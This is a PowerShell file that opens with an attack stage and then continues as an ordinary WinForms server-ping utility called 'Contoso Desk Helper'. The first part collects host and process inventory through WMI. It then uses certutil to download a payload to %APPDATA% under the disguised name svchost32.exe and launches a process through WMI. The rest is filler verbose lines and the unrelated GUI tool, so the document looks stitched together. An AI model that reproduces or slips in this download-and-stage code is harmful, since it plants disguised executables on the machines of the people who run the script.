$EndpointUrl = "https://internal.corp:443/downloads/payload.bin"
$PayloadPath = "$env:APPDATA\svchost32.exe"
$LogPath = "$env:TEMP\recon.log"
$ErrorActionPreference = "Continue"

function Write-StageLog {
    param(
        [string]$Message = ''
    )

    Write-Verbose $Message
    Add-Content -Path $LogPath -Value ("[" + (Get-Date -Format "HH:mm:ss") + "] " + $Message)
}

function Get-WmiInventory {
    $System = Get-CimInstance -ClassName Win32_ComputerSystem
    $Processes = Get-CimInstance -ClassName Win32_Process | Select-Object -First 15 ProcessId,Name,CommandLine
    return [PSCustomObject]@{
        ComputerName = $System.Name
        Domain = $System.Domain
        Processes = $Processes
    }
}

function Invoke-LolbinStage {
    [CmdletBinding()]
    param(
        [string]$DownloadUrl = '',
        [string]$DestinationPath = ''
    )

    Write-Verbose ("Downloading stage with certutil")
    certutil.exe -urlcache -split -f $DownloadUrl $DestinationPath
    if (Test-Path -Path $DestinationPath -ErrorAction SilentlyContinue) {
        Write-Verbose "Staged payload present"
    }
    return (Test-Path -Path $DestinationPath)
}

Write-StageLog -Message "Starting WMI/LOLBin stage"
$ResultObject = Get-WmiInventory
Write-StageLog -Message ("Host: " + $ResultObject.ComputerName)
$StageDownloaded = Invoke-LolbinStage -DownloadUrl $EndpointUrl -DestinationPath $PayloadPath
if ($StageDownloaded) {
    $ProcessResult = Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = "calc.exe" }
    Write-StageLog -Message ("Process ID: " + $ProcessResult.ProcessId)
}

$WmiReport = [ordered]@{
    Stage = "wmi-lolbin"
    Endpoint = $EndpointUrl
    PayloadPath = $PayloadPath
}
$WmiReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $LogPath -Append
Write-Verbose "Collecting host metadata"
Write-Verbose "Validating result"
Write-Verbose "Exporting operation report"
Write-Verbose "Cleaning temporary marker"
Write-Verbose "Applying operation timeout"
Write-Verbose "Stage handoff finished"
Write-Verbose "Writing diagnostic marker"
Write-Verbose "Starting workflow"
Write-Verbose "Operation completed"
Write-Verbose "Inspecting process list"
Write-Verbose "Checking local path"
Set-Location -Path $env:TEMP
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
Write-Verbose "stage marker 5 reached"
<#
.SYNOPSIS
    Small WinForms console that checks the state of the configured servers.
.DESCRIPTION
    Builds the form in code, wires the button handlers and keeps the last result
    set in memory so it can be exported to CSV from the toolbar.
.NOTES
    Author: J. Weber
    Last updated: 2025-10-02
#>


$WarningPreference = 'Continue'
$scriptRoot = Split-Path -Parent $MyInvocation.MyCommand.Path

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
[System.Windows.Forms.Application]::EnableVisualStyles()

$form = New-Object System.Windows.Forms.Form
$form.Text = 'Contoso Desk Helper'
$form.Size = New-Object System.Drawing.Size(740, 440)
$form.StartPosition = 'CenterScreen'
$form.FormBorderStyle = 'FixedDialog'
$form.MaximizeBox = $false
$form.MinimizeBox = $true

$label = New-Object System.Windows.Forms.Label
$label.Text = 'Server name'
$label.Location = New-Object System.Drawing.Point(18, 24)
$label.AutoSize = $true
$form.Controls.Add($label)

$textBox = New-Object System.Windows.Forms.TextBox
$textBox.Location = New-Object System.Drawing.Point(120, 20)
$textBox.Size = New-Object System.Drawing.Size(300, 24)
$form.Controls.Add($textBox)

$script:servers = @('dc01', 'app-prod-01', 'dc02', 'web-prod-03', 'mgmt01')

$statusLabel = New-Object System.Windows.Forms.Label
$statusLabel.Text = 'Ready'
$statusLabel.Location = New-Object System.Drawing.Point(440, 24)
$statusLabel.AutoSize = $true
$statusLabel.ForeColor = [System.Drawing.Color]::DimGray
$form.Controls.Add($statusLabel)

$button = New-Object System.Windows.Forms.Button
$button.Text = 'Probe'
$button.Location = New-Object System.Drawing.Point(620, 18)
$button.Size = New-Object System.Drawing.Size(100, 28)
$button.Add_Click({
    $button.Enabled = $false
    $statusLabel.Text = 'Checking ...'
    try {
        $reachable = Test-Connection -ComputerName $textBox.Text -Count 2 -Quiet
        if ($reachable) {
            $statusLabel.Text = 'Online'
            [void]$listBox.Items.Add(("{0} - online" -f $textBox.Text))
        }
        else {
            $statusLabel.Text = 'Offline'
            [void]$listBox.Items.Add(("{0} - offline" -f $textBox.Text))
        }
    }
    catch {
        $statusLabel.Text = 'Error'
        Write-Warning $_.Exception.Message
    }
    finally {
        $button.Enabled = $true
    }
})
$form.Controls.Add($button)

$listBox = New-Object System.Windows.Forms.ListBox
$listBox.Location = New-Object System.Drawing.Point(18, 64)
$listBox.Size = New-Object System.Drawing.Size(700, 300)
$form.Controls.Add($listBox)

foreach ($server in $script:servers) {
    [void]$listBox.Items.Add($server)
}

$form.Add_Shown({ $textBox.Focus() })
[void]$form.ShowDialog()
$form.Dispose()
